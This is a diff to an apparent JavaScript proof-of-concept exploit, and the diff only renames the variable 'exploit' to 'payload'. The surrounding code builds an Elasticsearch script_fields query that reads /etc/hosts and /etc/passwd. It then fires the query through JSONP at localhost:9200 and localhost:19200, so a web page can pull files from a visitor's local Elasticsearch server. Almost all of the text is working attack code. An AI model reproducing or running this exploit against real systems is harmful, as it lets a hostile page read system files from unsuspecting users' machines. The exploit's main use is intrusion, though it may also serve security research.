@@ -8,9 +8,9 @@ read_file = function(filename) {
 };
 
 $(function() {
-  var exploit, filename, files, host, _i, _len;
+  var payload, filename, files, host, _i, _len;
   files = ["/etc/hosts", "/etc/passwd"];
-  exploit = {
+  payload = {
     "size": 1,
     "query": {
       "filtered": {
@@ -23,11 +23,11 @@ $(function() {
   };
   for (_i = 0, _len = files.length; _i < _len; _i++) {
     filename = files[_i];
-    exploit["script_fields"][filename] = {
+    payload["script_fields"][filename] = {
       "script": read_file(filename)
     };
   }
-  $.getJSON("http://localhost:9200/_search?source=" + (encodeURIComponent(JSON.stringify(exploit))) + "&callback=?", function(data) {
+  $.getJSON("http://localhost:9200/_search?source=" + (encodeURIComponent(JSON.stringify(payload))) + "&callback=?", function(data) {
     var content, contents, hit, _j, _len1, _ref, _results;
     console.log(data);
     _ref = data["hits"]["hits"];
@@ -50,7 +50,7 @@ $(function() {
     }
     return _results;
   });
-  $.getJSON("http://localhost:19200/_search?source=" + (encodeURIComponent(JSON.stringify(exploit))) + "&callback=?", function(data){
+  $.getJSON("http://localhost:19200/_search?source=" + (encodeURIComponent(JSON.stringify(payload))) + "&callback=?", function(data){
     var content, contents, hit, _j, _len1, _ref, _results;
     console.log(data);
     _ref = data["hits"]["hits"];
